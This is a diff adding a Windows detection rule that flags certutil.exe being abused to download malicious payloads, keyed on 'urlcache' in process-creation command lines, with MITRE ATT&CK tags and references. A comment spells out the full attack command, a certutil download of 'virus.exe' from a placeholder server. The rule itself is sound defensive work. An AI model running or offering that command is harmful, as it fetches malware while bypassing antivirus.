@@ -1,0 +1,30 @@
+title: Certutil payload download (command)
+description: Detects scenarios where an attacker attempts to abuse certutil command to download obfuscated malicious payload.
+references:
+- https://www.elastic.co/guide/en/security/current/suspicious-certutil-commands.html
+- https://www.bleepingcomputer.com/news/security/certutilexe-could-allow-attackers-to-download-malware-while-bypassing-av/
+- https://attack.mitre.org/software/S0160/
+- https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/certutil
+- https://www.sentinelone.com/blog/malware-living-off-land-with-certutil/
+tags:
+- attack.defense_evasion
+- attack.t1105
+author: mdecrevoisier
+status: experimental
+logsource:
+  product: windows
+  category: process_creation
+detection: # Full command: "certutil -urlcache -split -f [serverURL] virus.exe"
+  selection:
+    EventID: 4688
+    NewProcessName|endswith: '\certutil.exe'
+    CommandLine|contains:
+      - urlcache
+      #- decode    # see other related rule
+      #- encodehex # see other related rule
+      #- encodehex # see other related rule
+      #- decodehex # see other related rule
+  condition: selection
+falsepositives:
+- None
+level: high
